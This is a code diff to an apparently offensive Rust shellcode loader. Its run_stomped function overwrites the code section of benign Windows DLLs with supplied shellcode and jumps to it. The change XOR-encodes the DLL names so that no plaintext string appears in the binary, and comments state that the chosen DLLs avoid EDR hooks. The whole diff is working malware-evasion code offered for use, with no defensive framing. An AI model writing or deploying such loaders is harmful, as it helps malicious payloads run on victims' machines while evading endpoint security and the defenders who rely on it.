@@ -86,14 +86,39 @@ pub unsafe fn run_stomped(shellcode: &[u8]) -> bool {
 
     // Try small, always-present DLLs in order: version < winmm < mpr < wldap32.
     // All have legitimate CFG-registered .text sections; none are EDR-hooked.
-    const CANDIDATES: &[&[u8]] = &[
-        b"version.dll\0",
-        b"winmm.dll\0",
-        b"mpr.dll\0",
-        b"wldap32.dll\0",
-    ];
-    for &dll in CANDIDATES {
-        if let Some(exec_ptr) = stomp_module(dll, shellcode) {
+    // Names are XOR-encoded with key 0x11 — decoded on stack so no plaintext in .rodata.
+    const K: u8 = 0x11;
+    {
+        let enc: [u8; 12] = [0x67,0x74,0x63,0x62,0x78,0x7e,0x7f,0x3f,0x75,0x7d,0x7d,0x11];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(exec_ptr) = stomp_module(&d, shellcode) {
+            let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
+            fn_ptr();
+            return true;
+        }
+    }
+    {
+        let enc: [u8; 10] = [0x66,0x78,0x7f,0x7c,0x7c,0x3f,0x75,0x7d,0x7d,0x11];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(exec_ptr) = stomp_module(&d, shellcode) {
+            let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
+            fn_ptr();
+            return true;
+        }
+    }
+    {
+        let enc: [u8; 8] = [0x7c,0x61,0x63,0x3f,0x75,0x7d,0x7d,0x11];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(exec_ptr) = stomp_module(&d, shellcode) {
+            let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
+            fn_ptr();
+            return true;
+        }
+    }
+    {
+        let enc: [u8; 12] = [0x66,0x7d,0x75,0x70,0x61,0x22,0x23,0x3f,0x75,0x7d,0x7d,0x11];
+        let mut d = enc; for b in d.iter_mut() { *b ^= K; }
+        if let Some(exec_ptr) = stomp_module(&d, shellcode) {
             let fn_ptr: extern "C" fn() = core::mem::transmute(exec_ptr);
             fn_ptr();
             return true;
